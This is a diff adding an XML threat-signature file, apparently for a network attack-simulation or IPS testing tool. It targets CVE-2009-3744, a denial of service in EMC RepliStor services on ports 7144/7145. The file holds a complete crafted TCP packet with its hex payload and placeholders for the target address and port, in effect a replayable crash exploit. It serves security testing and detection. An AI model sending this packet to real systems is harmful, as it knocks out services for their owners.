@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="EMC RepliStor rep_srv and ctrlservice Denial of Service"/>
+    <EngDesc display="true" value="A denial of service vulnerability exists in EMC RepliStor. The vulnerability is due to an input validation error while parsing a specially crafted packet sent to rep_srv.exe and ctrlservice.exe services. Remote unauthenticated attackers can exploit this vulnerability by sending a malicious packet to the services on ports 7144/TCP and 7145/TCP. Successful exploitation of this vulnerability would abnormally terminate the targeted service and cause a denial of service condition."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="EMC RepliStor"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="EMC"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="EMC_RepliStor"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="EMC_RepliStor_6.3.1.3_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-3744"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="8016b86b6dad6b1c77288bea01dbb990"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633960395167036380"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1260354629" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="M"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="L"/>
+      <for index="M"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="2:00:62:e0:a7:2a" destMac="2:00:62:e0:9c:2a" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0050" Identification="757A" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="63AB" srcIP="192.168.43.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="7523" destPort="$destPort" SeqNumber="6606F81B" AckNumber="8044455A" HeaderLength="08" WindowSize="002E" Checksum="2AEE" UrgentPointer="0000" Options="0101080A7A388D6800000000" Payload="54930000000000000000000000000000414141410000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
